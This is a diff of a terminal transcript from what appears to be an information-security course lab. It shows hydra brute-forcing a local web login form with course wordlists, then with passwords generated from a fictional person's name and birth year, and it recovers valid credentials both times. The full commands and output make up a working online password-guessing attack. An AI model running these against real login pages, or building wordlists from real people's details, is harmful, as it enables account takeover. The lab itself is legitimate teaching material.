@@ -1,10 +1,10 @@
 
 $ curl -fsS -d username=admin\&password=wrong http://127.0.0.1:8000/login
 "Invalid credentials"
-$ hydra -f -I -V -t 1 -L /lab/course-usernames.txt -P /lab/course-passwords.txt -s 8000 127.0.0.1 http-post-form /login:username=\^USER\^\&password=\^PASS\^:F=Invalid
+$ hydra -f -I -V -t 1 -L /opt/info-sec-lab12/course-usernames.txt -P /opt/info-sec-lab12/course-passwords.txt -s 8000 127.0.0.1 http-post-form /login:username=\^USER\^\&password=\^PASS\^:F=Invalid
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-12 11:29:31
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-12 13:20:30
 [DATA] max 1 task per 1 server, overall 1 task, 1717 login tries (l:17/p:101), ~1717 tries per task
 [DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:F=Invalid
 [ATTEMPT] target 127.0.0.1 - login "root" - pass "123456" - 1 of 1717 [child 0] (0/0)
@@ -197,18 +197,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-12 11:29:
 [8000][http-post-form] host: 127.0.0.1   login: admin   password: 12345admin
 [STATUS] attack finished for 127.0.0.1 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-12 11:30:11
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-12 13:21:10
 
 $ curl -fsS -d username=admin\&password=12345admin http://127.0.0.1:8000/login
 "secret token"
-$ python3 /lab/profile_words.py
+$ python3 /opt/info-sec-lab12/profile_words.py
 Fictional profile: Mira Example, birth year 1999.
 Generated 12 candidates.
 
 $ hydra -f -I -V -t 1 -L /tmp/lab12/profile-usernames.txt -P /tmp/lab12/profile-passwords.txt -s 8000 127.0.0.1 http-post-form /profile-login:username=\^USER\^\&password=\^PASS\^:F=Invalid
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-12 11:30:11
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-12 13:21:10
 [DATA] max 1 task per 1 server, overall 1 task, 12 login tries (l:1/p:12), ~12 tries per task
 [DATA] attacking http-post-form://127.0.0.1:8000/profile-login:username=^USER^&password=^PASS^:F=Invalid
 [ATTEMPT] target 127.0.0.1 - login "demo" - pass "mira1999" - 1 of 12 [child 0] (0/0)
@@ -220,7 +220,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-12 11:30:
 [8000][http-post-form] host: 127.0.0.1   login: demo   password: Mira1999!
 [STATUS] attack finished for 127.0.0.1 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-12 11:30:13
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-12 13:21:11
 
 $ curl -fsS -d username=demo\&password=Mira1999\! http://127.0.0.1:8000/profile-login
 "fictional profile token"
